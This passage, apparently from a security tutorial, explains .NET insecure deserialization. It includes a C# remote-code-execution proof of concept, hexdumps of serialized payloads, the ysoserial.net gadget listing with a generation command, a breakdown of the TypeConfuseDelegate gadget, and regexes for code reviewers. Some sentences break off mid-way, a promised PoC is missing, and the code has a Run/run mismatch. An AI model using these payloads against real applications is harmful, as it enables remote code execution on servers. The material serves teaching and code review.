+<span class="k">namespace</span> <span class="nn">BinarySerialization</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">BinarySerialization</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">filename</span> <span class="p">=</span> <span class="s">&quot;desert.ser&quot;</span><span class="p">;</span>
+<span class="na">        [STAThread]</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
+            <span class="c1">// Delete old file, if it exists</span>
+            <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="c1">// Serialize RCE</span>
+            <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertSerial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="c1">// Wait for Enter</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Press Enter Key&quot;</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">deleteFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filname</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Deleting old file&quot;</span><span class="p">);</span>
+                <span class="n">File</span><span class="p">.</span><span class="n">Delete</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>     
+
+        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">desertSerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Create desert name</span>
+            <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
+            <span class="n">desert</span><span class="p">.</span><span class="n">cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
+            <span class="c1">// Persist to file</span>
+            <span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert (RCE)&quot;</span><span class="p">);</span>
+            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">desert</span><span class="p">);</span>
+            <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+
+<span class="na">    [Serializable]</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+    <span class="p">{</span>
+        <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span><span class="p">;</span>
+        <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
+        <span class="p">{</span>
+            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span> <span class="p">}</span>
+            <span class="k">set</span>
+            <span class="p">{</span>
+                <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
+                <span class="c1">//run(); Disabled to avoid spawning a calc while serializing </span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">private</span> <span class="k">void</span> <span class="nf">run</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+            <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">Run</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>Serializing that would produce the following file:</p>
+<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
+00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
+00000010  00 0c 02 00 00 00 47 42  69 6e 61 72 79 53 65 72  |......GBinarySer|
+00000020  69 6c 69 61 7a 65 72 2c  20 56 65 72 73 69 6f 6e  |iliazer, Version|
+00000030  3d 30 2e 30 2e 30 2e 30  2c 20 43 75 6c 74 75 72  |=0.0.0.0, Cultur|
+00000040  65 3d 6e 65 75 74 72 61  6c 2c 20 50 75 62 6c 69  |e=neutral, Publi|
+00000050  63 4b 65 79 54 6f 6b 65  6e 3d 6e 75 6c 6c 05 01  |cKeyToken=null..|
+00000060  00 00 00 17 42 69 6e 61  72 79 53 65 72 69 61 6c  |....BinarySerial|
+00000070  69 7a 61 74 69 6f 6e 2e  52 43 45 01 00 00 00 04  |ization.RCE.....|
+00000080  5f 63 6d 64 01 02 00 00  00 06 03 00 00 00 08 63  |_cmd...........c|
+00000090  61 6c 63 2e 65 78 65 0b                           |alc.exe.|
+00000098
+</pre></div>
+
+<p>Once deserialized by the application, it would automatically spawn a calculator on the application hosting server.</p>
+<p>There are many other type of classes that can be abused, like classing using Delegate or </p>
+<p>So, the above pieces of code are trivial examples on how the exploitation process works. The next question would be, could it be possible to exploit it without relying on the Damn Vulnerable RCE class? The answer is yes, and it&rsquo;s provided, similarly to JAVA, by means of <strong>POP gadgets</strong>. </p>
+<p>The only exception being that each formatter holds its own exploitation methodology and its gadgets. Practically each formatter has visibility only to certain objects an types, so not every gadget can be used with a specific formatter (We&rsquo;ll see a manual example of that later on in this document).</p>
+<p>During the years, <strong>ysoserial.net</strong> was created, which allows to generate automatically serialized payloads using known .NET gadgets. The tool is available <a href="https://github.com/pwntester/ysoserial.net/">here</a></p>
+<div class="codehilite"><pre>ysoserial.net generates deserialization payloads for a variety of .NET formatters.
+
+Available formatters:
+        ActivitySurrogateDisableTypeCheck (ActivitySurrogateDisableTypeCheck Gadget by Nick Landers. Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        SoapFormatter
+                        NetDataContractSerializer
+                        LosFormatter
+        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;.)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        SoapFormatter
+                        LosFormatter
+        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        SoapFormatter
+                        LosFormatter
+        ObjectDataProvider (ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz)
+                Formatters:
+                        Xaml
+                        Json.Net
+                        FastJson
+                        JavaScriptSerializer
+                        XmlSerializer
+                        DataContractSerializer
+                        YamlDotNet &lt; 5.0.0
+        TextFormattingRunProperties (TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        SoapFormatter
+                        NetDataContractSerializer
+                        LosFormatter
+        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        SoapFormatter
+                        NetDataContractSerializer
+                        LosFormatter
+        TypeConfuseDelegate (TypeConfuseDelegate gadget by James Forshaw)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        NetDataContractSerializer
+                        LosFormatter
+        TypeConfuseDelegateMono (TypeConfuseDelegate gadget by James Forshaw - Tweaked to work with Mono)
+                Formatters:
+                        BinaryFormatter
+                        ObjectStateFormatter
+                        NetDataContractSerializer
+                        LosFormatter
+        WindowsIdentity (WindowsIdentity Gadget by Levi Broderick)
+                Formatters:
+                        BinaryFormatter
+                        Json.Net
+                        DataContractSerializer
+                        SoapFormatter
+
+Available plugins:
+        ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
+        Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
+        ApplicationTrust (Generates XML payload for the ApplicationTrust class)
+        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
+        DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
+        Resx (Generates RESX files)
+        SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
+        SharePoint (Generates poayloads for the following SharePoint CVEs: CVE-2019-0604, CVE-2018-8421)
+        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
+        ViewState (Generates a ViewState using known MachineKey parameters)
+</pre></div>
+
+<p>A valid payload for the example deserializer can be generated via the following command:</p>
+<div class="codehilite"><pre>$ ysoserial-net -f BinaryFormatter -g TypeConfuseDelegate -o raw -c calc.exe &gt; desert.ser
+</pre></div>
+
+<p>The following object would be created:</p>
+<div class="codehilite"><pre>$ hexdump.exe -C desert.ser
+00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
+00000010  00 0c 02 00 00 00 49 53  79 73 74 65 6d 2c 20 56  |......ISystem, V|
+00000020  65 72 73 69 6f 6e 3d 34  2e 30 2e 30 2e 30 2c 20  |ersion=4.0.0.0, |
+00000030  43 75 6c 74 75 72 65 3d  6e 65 75 74 72 61 6c 2c  |Culture=neutral,|
+00000040  20 50 75 62 6c 69 63 4b  65 79 54 6f 6b 65 6e 3d  | PublicKeyToken=|
+00000050  62 37 37 61 35 63 35 36  31 39 33 34 65 30 38 39  |b77a5c561934e089|
+00000060  05 01 00 00 00 84 01 53  79 73 74 65 6d 2e 43 6f  |.......System.Co|
+00000070  6c 6c 65 63 74 69 6f 6e  73 2e 47 65 6e 65 72 69  |llections.Generi|
+00000080  63 2e 53 6f 72 74 65 64  53 65 74 60 31 5b 5b 53  |c.SortedSet`1[[S|
+00000090  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
+000000a0  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
+000000b0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
+000000c0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
+000000d0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
+000000e0  36 31 39 33 34 65 30 38  39 5d 5d 04 00 00 00 05  |61934e089]].....|
+000000f0  43 6f 75 6e 74 08 43 6f  6d 70 61 72 65 72 07 56  |Count.Comparer.V|
+00000100  65 72 73 69 6f 6e 05 49  74 65 6d 73 00 03 00 06  |ersion.Items....|
+00000110  08 8d 01 53 79 73 74 65  6d 2e 43 6f 6c 6c 65 63  |...System.Collec|
+00000120  74 69 6f 6e 73 2e 47 65  6e 65 72 69 63 2e 43 6f  |tions.Generic.Co|
+00000130  6d 70 61 72 69 73 6f 6e  43 6f 6d 70 61 72 65 72  |mparisonComparer|
+00000140  60 31 5b 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |`1[[System.Strin|
+00000150  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
+00000160  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
+00000170  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
+00000180  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
+00000190  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 5d  |7a5c561934e089]]|
+000001a0  08 02 00 00 00 02 00 00  00 09 03 00 00 00 02 00  |................|
+000001b0  00 00 09 04 00 00 00 04  03 00 00 00 8d 01 53 79  |..............Sy|
+000001c0  73 74 65 6d 2e 43 6f 6c  6c 65 63 74 69 6f 6e 73  |stem.Collections|
+000001d0  2e 47 65 6e 65 72 69 63  2e 43 6f 6d 70 61 72 69  |.Generic.Compari|
+000001e0  73 6f 6e 43 6f 6d 70 61  72 65 72 60 31 5b 5b 53  |sonComparer`1[[S|
+000001f0  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 6d 73  |ystem.String, ms|
+00000200  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
+00000210  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
+00000220  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
+00000230  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
+00000240  36 31 39 33 34 65 30 38  39 5d 5d 01 00 00 00 0b  |61934e089]].....|
+00000250  5f 63 6f 6d 70 61 72 69  73 6f 6e 03 22 53 79 73  |_comparison.&quot;Sys|
+00000260  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
+00000270  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 09  |alizationHolder.|
+00000280  05 00 00 00 11 04 00 00  00 02 00 00 00 06 06 00  |................|
+00000290  00 00 0b 2f 63 20 63 61  6c 63 2e 65 78 65 06 07  |.../c calc.exe..|
+000002a0  00 00 00 03 63 6d 64 04  05 00 00 00 22 53 79 73  |....cmd.....&quot;Sys|
+000002b0  74 65 6d 2e 44 65 6c 65  67 61 74 65 53 65 72 69  |tem.DelegateSeri|
+000002c0  61 6c 69 7a 61 74 69 6f  6e 48 6f 6c 64 65 72 03  |alizationHolder.|
+000002d0  00 00 00 08 44 65 6c 65  67 61 74 65 07 6d 65 74  |....Delegate.met|
+000002e0  68 6f 64 30 07 6d 65 74  68 6f 64 31 03 03 03 30  |hod0.method1...0|
+000002f0  53 79 73 74 65 6d 2e 44  65 6c 65 67 61 74 65 53  |System.DelegateS|
+00000300  65 72 69 61 6c 69 7a 61  74 69 6f 6e 48 6f 6c 64  |erializationHold|
+00000310  65 72 2b 44 65 6c 65 67  61 74 65 45 6e 74 72 79  |er+DelegateEntry|
+00000320  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
+00000330  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
+00000340  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
+00000350  2f 53 79 73 74 65 6d 2e  52 65 66 6c 65 63 74 69  |/System.Reflecti|
+00000360  6f 6e 2e 4d 65 6d 62 65  72 49 6e 66 6f 53 65 72  |on.MemberInfoSer|
+00000370  69 61 6c 69 7a 61 74 69  6f 6e 48 6f 6c 64 65 72  |ializationHolder|
+00000380  09 08 00 00 00 09 09 00  00 00 09 0a 00 00 00 04  |................|
+00000390  08 00 00 00 30 53 79 73  74 65 6d 2e 44 65 6c 65  |....0System.Dele|
+000003a0  67 61 74 65 53 65 72 69  61 6c 69 7a 61 74 69 6f  |gateSerializatio|
+000003b0  6e 48 6f 6c 64 65 72 2b  44 65 6c 65 67 61 74 65  |nHolder+Delegate|
+000003c0  45 6e 74 72 79 07 00 00  00 04 74 79 70 65 08 61  |Entry.....type.a|
+000003d0  73 73 65 6d 62 6c 79 06  74 61 72 67 65 74 12 74  |ssembly.target.t|
+000003e0  61 72 67 65 74 54 79 70  65 41 73 73 65 6d 62 6c  |argetTypeAssembl|
+000003f0  79 0e 74 61 72 67 65 74  54 79 70 65 4e 61 6d 65  |y.targetTypeName|
+00000400  0a 6d 65 74 68 6f 64 4e  61 6d 65 0d 64 65 6c 65  |.methodName.dele|
+00000410  67 61 74 65 45 6e 74 72  79 01 01 02 01 01 01 03  |gateEntry.......|
+00000420  30 53 79 73 74 65 6d 2e  44 65 6c 65 67 61 74 65  |0System.Delegate|
+00000430  53 65 72 69 61 6c 69 7a  61 74 69 6f 6e 48 6f 6c  |SerializationHol|
+00000440  64 65 72 2b 44 65 6c 65  67 61 74 65 45 6e 74 72  |der+DelegateEntr|
+00000450  79 06 0b 00 00 00 b0 02  53 79 73 74 65 6d 2e 46  |y.......System.F|
+00000460  75 6e 63 60 33 5b 5b 53  79 73 74 65 6d 2e 53 74  |unc`3[[System.St|
+00000470  72 69 6e 67 2c 20 6d 73  63 6f 72 6c 69 62 2c 20  |ring, mscorlib, |
+00000480  56 65 72 73 69 6f 6e 3d  34 2e 30 2e 30 2e 30 2c  |Version=4.0.0.0,|
+00000490  20 43 75 6c 74 75 72 65  3d 6e 65 75 74 72 61 6c  | Culture=neutral|
+000004a0  2c 20 50 75 62 6c 69 63  4b 65 79 54 6f 6b 65 6e  |, PublicKeyToken|
+000004b0  3d 62 37 37 61 35 63 35  36 31 39 33 34 65 30 38  |=b77a5c561934e08|
+000004c0  39 5d 2c 5b 53 79 73 74  65 6d 2e 53 74 72 69 6e  |9],[System.Strin|
+000004d0  67 2c 20 6d 73 63 6f 72  6c 69 62 2c 20 56 65 72  |g, mscorlib, Ver|
+000004e0  73 69 6f 6e 3d 34 2e 30  2e 30 2e 30 2c 20 43 75  |sion=4.0.0.0, Cu|
+000004f0  6c 74 75 72 65 3d 6e 65  75 74 72 61 6c 2c 20 50  |lture=neutral, P|
+00000500  75 62 6c 69 63 4b 65 79  54 6f 6b 65 6e 3d 62 37  |ublicKeyToken=b7|
+00000510  37 61 35 63 35 36 31 39  33 34 65 30 38 39 5d 2c  |7a5c561934e089],|
+00000520  5b 53 79 73 74 65 6d 2e  44 69 61 67 6e 6f 73 74  |[System.Diagnost|
+00000530  69 63 73 2e 50 72 6f 63  65 73 73 2c 20 53 79 73  |ics.Process, Sys|
+00000540  74 65 6d 2c 20 56 65 72  73 69 6f 6e 3d 34 2e 30  |tem, Version=4.0|
+00000550  2e 30 2e 30 2c 20 43 75  6c 74 75 72 65 3d 6e 65  |.0.0, Culture=ne|
+00000560  75 74 72 61 6c 2c 20 50  75 62 6c 69 63 4b 65 79  |utral, PublicKey|
+00000570  54 6f 6b 65 6e 3d 62 37  37 61 35 63 35 36 31 39  |Token=b77a5c5619|
+00000580  33 34 65 30 38 39 5d 5d  06 0c 00 00 00 4b 6d 73  |34e089]].....Kms|
+00000590  63 6f 72 6c 69 62 2c 20  56 65 72 73 69 6f 6e 3d  |corlib, Version=|
+000005a0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
+000005b0  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
+000005c0  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
+000005d0  36 31 39 33 34 65 30 38  39 0a 06 0d 00 00 00 49  |61934e089......I|
+000005e0  53 79 73 74 65 6d 2c 20  56 65 72 73 69 6f 6e 3d  |System, Version=|
+000005f0  34 2e 30 2e 30 2e 30 2c  20 43 75 6c 74 75 72 65  |4.0.0.0, Culture|
+00000600  3d 6e 65 75 74 72 61 6c  2c 20 50 75 62 6c 69 63  |=neutral, Public|
+00000610  4b 65 79 54 6f 6b 65 6e  3d 62 37 37 61 35 63 35  |KeyToken=b77a5c5|
+00000620  36 31 39 33 34 65 30 38  39 06 0e 00 00 00 1a 53  |61934e089......S|
+00000630  79 73 74 65 6d 2e 44 69  61 67 6e 6f 73 74 69 63  |ystem.Diagnostic|
+00000640  73 2e 50 72 6f 63 65 73  73 06 0f 00 00 00 05 53  |s.Process......S|
+00000650  74 61 72 74 09 10 00 00  00 04 09 00 00 00 2f 53  |tart........../S|
+00000660  79 73 74 65 6d 2e 52 65  66 6c 65 63 74 69 6f 6e  |ystem.Reflection|
+00000670  2e 4d 65 6d 62 65 72 49  6e 66 6f 53 65 72 69 61  |.MemberInfoSeria|
+00000680  6c 69 7a 61 74 69 6f 6e  48 6f 6c 64 65 72 07 00  |lizationHolder..|
+00000690  00 00 04 4e 61 6d 65 0c  41 73 73 65 6d 62 6c 79  |...Name.Assembly|
+000006a0  4e 61 6d 65 09 43 6c 61  73 73 4e 61 6d 65 09 53  |Name.ClassName.S|
+000006b0  69 67 6e 61 74 75 72 65  0a 53 69 67 6e 61 74 75  |ignature.Signatu|
+000006c0  72 65 32 0a 4d 65 6d 62  65 72 54 79 70 65 10 47  |re2.MemberType.G|
+000006d0  65 6e 65 72 69 63 41 72  67 75 6d 65 6e 74 73 01  |enericArguments.|
+000006e0  01 01 01 01 00 03 08 0d  53 79 73 74 65 6d 2e 54  |........System.T|
+000006f0  79 70 65 5b 5d 09 0f 00  00 00 09 0d 00 00 00 09  |ype[]...........|
+00000700  0e 00 00 00 06 14 00 00  00 3e 53 79 73 74 65 6d  |.........&gt;System|
+00000710  2e 44 69 61 67 6e 6f 73  74 69 63 73 2e 50 72 6f  |.Diagnostics.Pro|
+00000720  63 65 73 73 20 53 74 61  72 74 28 53 79 73 74 65  |cess Start(Syste|
+00000730  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
+00000740  2e 53 74 72 69 6e 67 29  06 15 00 00 00 3e 53 79  |.String).....&gt;Sy|
+00000750  73 74 65 6d 2e 44 69 61  67 6e 6f 73 74 69 63 73  |stem.Diagnostics|
+00000760  2e 50 72 6f 63 65 73 73  20 53 74 61 72 74 28 53  |.Process Start(S|
+00000770  79 73 74 65 6d 2e 53 74  72 69 6e 67 2c 20 53 79  |ystem.String, Sy|
+00000780  73 74 65 6d 2e 53 74 72  69 6e 67 29 08 00 00 00  |stem.String)....|
+00000790  0a 01 0a 00 00 00 09 00  00 00 06 16 00 00 00 07  |................|
+000007a0  43 6f 6d 70 61 72 65 09  0c 00 00 00 06 18 00 00  |Compare.........|
+000007b0  00 0d 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 06  |..System.String.|
+000007c0  19 00 00 00 2b 49 6e 74  33 32 20 43 6f 6d 70 61  |....+Int32 Compa|
+000007d0  72 65 28 53 79 73 74 65  6d 2e 53 74 72 69 6e 67  |re(System.String|
+000007e0  2c 20 53 79 73 74 65 6d  2e 53 74 72 69 6e 67 29  |, System.String)|
+000007f0  06 1a 00 00 00 32 53 79  73 74 65 6d 2e 49 6e 74  |.....2System.Int|
+00000800  33 32 20 43 6f 6d 70 61  72 65 28 53 79 73 74 65  |32 Compare(Syste|
+00000810  6d 2e 53 74 72 69 6e 67  2c 20 53 79 73 74 65 6d  |m.String, System|
+00000820  2e 53 74 72 69 6e 67 29  08 00 00 00 0a 01 10 00  |.String)........|
+00000830  00 00 08 00 00 00 06 1b  00 00 00 71 53 79 73 74  |...........qSyst|
+00000840  65 6d 2e 43 6f 6d 70 61  72 69 73 6f 6e 60 31 5b  |em.Comparison`1[|
+00000850  5b 53 79 73 74 65 6d 2e  53 74 72 69 6e 67 2c 20  |[System.String, |
+00000860  6d 73 63 6f 72 6c 69 62  2c 20 56 65 72 73 69 6f  |mscorlib, Versio|
+00000870  6e 3d 34 2e 30 2e 30 2e  30 2c 20 43 75 6c 74 75  |n=4.0.0.0, Cultu|
+00000880  72 65 3d 6e 65 75 74 72  61 6c 2c 20 50 75 62 6c  |re=neutral, Publ|
+00000890  69 63 4b 65 79 54 6f 6b  65 6e 3d 62 37 37 61 35  |icKeyToken=b77a5|
+000008a0  63 35 36 31 39 33 34 65  30 38 39 5d 5d 09 0c 00  |c561934e089]]...|
+000008b0  00 00 0a 09 0c 00 00 00  09 18 00 00 00 09 16 00  |................|
+000008c0  00 00 0a 0b                                       |....|
+</pre></div>
+
+<p>Trying to deserialize the above object would cause a calculator to spawn on the system. As seenable from the command, we used the gadget <code>TypeConfuseDelegate</code> as a valid gadget for exploitation, the process used by this gadget is different yet similar to the one used above by our custom implemented RCE class. </p>
+<p>Before digging deep into the process used by <code>TypeConfuseDelegate</code>, let&rsquo;s first describe how the Delegate class is used in the .NET architecture, and how it can be exploited by insecure derialization in a similar way to the above RCE class. Let&rsquo;s then consider the following class:</p>
+<div class="codehilite"><pre><span class="na">[Serializable]</span> 
+<span class="k">public</span> <span class="k">class</span> <span class="nc">WrapEvent</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+<span class="p">{</span>
+    <span class="n">Delegate</span> <span class="n">_delegated</span><span class="p">;</span>
+    <span class="kt">string</span> <span class="n">_parameters</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nf">WrapEvent</span><span class="p">(</span><span class="n">Delegate</span> <span class="n">delegated</span><span class="p">,</span> <span class="kt">string</span> <span class="n">parameters</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_delegated</span> <span class="p">=</span> <span class="n">delegated</span><span class="p">;</span>
+        <span class="n">_parameters</span> <span class="p">=</span> <span class="n">parameters</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="kt">bool</span> <span class="nf">Run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="n">_delegated</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">(</span><span class="n">_parameters</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">void</span> <span class="nf">OnDeserialization</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Run</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>How can this be exploited? By default, Microsoft doesn&rsquo;t enforce type signatures of delegate objects, so the main idea is to find a way to set the <code>_delegate</code> parameter to <code>System.Diagnostic.Process</code> and <code>_parameters</code> to a command we want to execute. </p>
+<p>To achieve this result, <code>TypeConfuseDelegate</code> generates a payload operating the following steps:</p>
+<ol>
+<li>Create a Comparison object (function to compare strings)</li>
+<li>Create a MulticastDelegate with two entries, setting both of them to Comparison (so now we have MulticastDelegate<Comparison(String,String),Comparison(String,String)>)</li>
+<li>Create a SortedSet, and associate the ComparisonComparer as the compare function  </li>
+<li>Using introspection, change the type of one of the Comparison objects to Process.Start</li>
+<li>Add to the SortedSet two strings (&ldquo;cmd&rdquo;, &ldquo;args&rdquo;)</li>
+</ol>
+<p><em>Note that cmd, args could be any command - args combination</em></p>
+<p>Upon deserialization, the following would then happen:</p>
+<ol>
+<li>To rebuild the SortedSet, the comparison function is reinitialised</li>
+<li>The ComparerComparison call the MulticastDelegate as its comparison delegate</li>
+<li>To operate the comparison, the MulticastDelegate run the Compare() and Start() functions in parallel</li>
+<li>Compare will just compare &ldquo;cmd&rdquo; and &ldquo;arg&rdquo; as strings</li>
+<li>Start will spawn a process and execute the &ldquo;cmd&rdquo; and &ldquo;args&rdquo; as OS commands</li>
+</ol>
+<h4 id="net-text-based-archive-format">.NET: Text-Based Archive Format<a class="headerlink" href="#net-text-based-archive-format" title="Permanent link"></a></h4>
+<p>As for JAVA, .NET is not immune to deserialization issues affecting Text-Based archive formats, such as XML, JSON, [Net]DataContract. These formats are usually handled by the following serializers:</p>
+<ul>
+<li>XmlSerializer (XML)</li>
+<li>[Net]DataContractSerializer (XML dialect)</li>
+<li>JavaScriptSerializer (JSON)</li>
+</ul>
+<p><strong>XML</strong></p>
+<p>The </p>
+<p>To get a better look to the process, we&rsquo;ll explore a way to use the XAML formatter to achieve remote code execution during deserialization abusing the gadget <code>ObectDataProvider</code>.</p>
+<p>The follwing PoC uses the steps above to serialize data which results in an RCE:</p>
+<p><strong>Tips for Source Code reviewers</strong></p>
+<p>To find this kind of vulnerability it is usually enough to search the code for common regexes, like: </p>
+<ul>
+<li><code>(JavaScript|Xml|(Net)*DataContract)Serializer</code></li>
+<li><code>(Binary|ObjectState|Los|Soap)Formatter</code></li>
+<li><code>Json.Net</code></li>
+<li><code>YamlDotNet</code></li>
+<li><code>FastJson</code></li>
+<li><code>Xaml</code></li>
+</ul>
+<p>For each match, the code should be manually inspected to see whether the object read can be manipulated by an external attacker.</p>
